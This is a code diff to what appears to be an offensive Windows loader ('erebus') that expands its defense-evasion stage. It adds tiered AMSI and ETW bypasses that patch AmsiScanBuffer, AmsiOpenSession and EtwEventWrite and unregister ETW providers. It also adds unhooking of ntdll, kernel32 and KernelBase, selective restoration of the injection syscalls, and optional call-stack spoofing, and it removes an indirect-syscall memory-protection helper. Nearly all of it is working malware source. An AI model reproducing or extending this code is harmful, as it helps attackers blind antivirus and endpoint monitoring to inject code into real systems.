@@ -18,8 +18,12 @@
  */
 
 #include "../../include/loader.hpp"
+#include "../../include/evasion/evasion_utils.hpp"
 #include "../../include/evasion/evasion.hpp"
 #include "../../include/evasion/syscall_backend.hpp"
+#include "../../include/evasion/amsi_bypass.hpp"
+#include "../../include/evasion/etw_bypass.hpp"
+#include "../../include/evasion/unhook_extended.hpp"
 #if CONFIG_CALLSTACK_SPOOF_ENABLED
 #include "../../include/evasion/callstack_spoof.hpp"
 #endif
@@ -27,47 +31,7 @@
 namespace erebus {
 namespace evasion {
 
-    // ------------------------------------------------------------------
-    // Protection flip helper using NtProtectVirtualMemory.
-    // Returns TRUE on success, fills *oldProtect with the prior value.
-    // ------------------------------------------------------------------
-    static BOOL FlipProtection(LPVOID addr, SIZE_T size, ULONG newProtect, PULONG oldProtect)
-    {
-        // Prefer the indirect-syscall shim planted by InitIndirectSyscalls().
-        // The shim runs no code of its own beyond `mov r10, rcx; mov eax, ssn;
-        // jmp <gadget>`, so the actual `syscall` instruction executes from
-        // inside ntdll's .text where kernel telemetry expects it.
-        typeNtProtectVirtualMemory NtProtectVirtualMemory =
-            (typeNtProtectVirtualMemory)GetSyscallStub(H("NtProtectVirtualMemory"));
-
-        // Fall back to the (post-unhook) hashed import if the indirect
-        // path is unavailable. This covers the narrow window before
-        // InitIndirectSyscalls runs and the "unhook failed" case.
-        //
-        // NOTE: ImportFunction() expands to `type name = (type)resolver(...)`,
-        // which would declare a NEW local `NtProtectVirtualMemory` shadowing
-        // the outer one and leaving that outer (still-NULL) slot unchanged.
-        // Fetch via GetProcAddressC directly so the outer variable receives
-        // the resolved pointer.
-        if (!NtProtectVirtualMemory) {
-            HMODULE ntdll = ImportModule("ntdll.dll");
-            if (!ntdll) return FALSE;
-            NtProtectVirtualMemory = (typeNtProtectVirtualMemory)
-                erebus::GetProcAddressC(ntdll, H("NtProtectVirtualMemory"));
-            if (!NtProtectVirtualMemory) return FALSE;
-        }
-
-        PVOID base = addr;
-        SIZE_T region = size;
-        NTSTATUS status = NtProtectVirtualMemory(
-            (HANDLE)(LONG_PTR)-1,   // current process pseudo-handle
-            &base,
-            &region,
-            newProtect,
-            oldProtect
-        );
-        return NT_SUCCESS(status);
-    }
+    // FlipProtection is defined in evasion_utils.hpp (included via loader.hpp).
 
     // ----------------------------------------------------------------
     // AMSI bypass - patch AmsiScanBuffer
@@ -178,21 +142,73 @@ namespace evasion {
 
     BOOL RunEvasionPatches()
     {
-        // Unhook ntdll first so AMSI / ETW patches and all downstream
-        // syscalls use clean stubs. A failed unhook is non-fatal - the
-        // AMSI / ETW patches still have a chance of landing through
-        // whatever hook is in place.
-        UnhookNtdll();
+        // -----------------------------------------------------------------
+        // Unhook - scope controlled by CONFIG_UNHOOK_SCOPE.
+        // Unhooking runs first so all subsequent patches and syscalls reach
+        // clean stubs. Failures are non-fatal; downstream evasion still has
+        // a chance through whatever hook may remain.
+        // -----------------------------------------------------------------
 
+        // CONFIG_UNHOOK_SCOPE 0: ntdll only (always runs when scope >= 0,
+        // which is every valid value).
+#if CONFIG_UNHOOK_SCOPE >= 0
+        UnhookNtdll();
+#endif
+        // CONFIG_UNHOOK_SCOPE 1: also unhook kernel32 and KernelBase.
+#if CONFIG_UNHOOK_SCOPE >= 1
+        UnhookKernel32();
+        UnhookKernelbase();
+#endif
+        // CONFIG_UNHOOK_SCOPE 2: selective per-function prologue restore.
+        // Default list covers the Nt* functions used by the injection path.
+#if CONFIG_UNHOOK_SCOPE == 2
+        static const ULONG kSelectiveHashes[] = {
+            erebus::HashStringFowlerNollVoVariant1a("NtAllocateVirtualMemory"),
+            erebus::HashStringFowlerNollVoVariant1a("NtWriteVirtualMemory"),
+            erebus::HashStringFowlerNollVoVariant1a("NtProtectVirtualMemory"),
+            erebus::HashStringFowlerNollVoVariant1a("NtCreateSection"),
+            erebus::HashStringFowlerNollVoVariant1a("NtMapViewOfSection"),
+            erebus::HashStringFowlerNollVoVariant1a("NtOpenSection"),
+        };
+        UnhookSelective(kSelectiveHashes, sizeof(kSelectiveHashes) / sizeof(kSelectiveHashes[0]));
+#endif
+
+        // -----------------------------------------------------------------
+        // Callstack spoofing init (optional compile-time feature).
+        // -----------------------------------------------------------------
 #if CONFIG_CALLSTACK_SPOOF_ENABLED
         InitCallstackSpoof();
 #endif
 
-        BOOL amsi_ok = PatchAmsi();
-        BOOL etw_ok  = PatchEtw();
+        // -----------------------------------------------------------------
+        // AMSI - tiered bypass controlled by CONFIG_AMSI_BYPASS_TYPE.
+        // -----------------------------------------------------------------
+#if CONFIG_AMSI_BYPASS_TYPE >= 1
+        PatchAmsi();            // existing - patches AmsiScanBuffer
+#endif
+#if CONFIG_AMSI_BYPASS_TYPE >= 2
+        PatchAmsiOpenSession();
+#endif
+#if CONFIG_AMSI_BYPASS_TYPE >= 3
+        InvalidateAmsiContext();
+#endif
+
+        // -----------------------------------------------------------------
+        // ETW - tiered bypass controlled by CONFIG_ETW_BYPASS_TYPE.
+        // -----------------------------------------------------------------
+#if CONFIG_ETW_BYPASS_TYPE >= 1
+        PatchEtw();             // existing - patches EtwEventWrite
+#endif
+#if CONFIG_ETW_BYPASS_TYPE >= 2
+        PatchEtwEventWriteFull();
+#endif
+#if CONFIG_ETW_BYPASS_TYPE >= 3
+        UnregisterEtwProviders();
+#endif
+
         // Partial success is acceptable - AMSI may not be loaded in
-        // non-.NET host processes.
-        return amsi_ok || etw_ok;
+        // non-.NET host processes; ETW patch is always available.
+        return TRUE;
     }
 
 } // namespace evasion
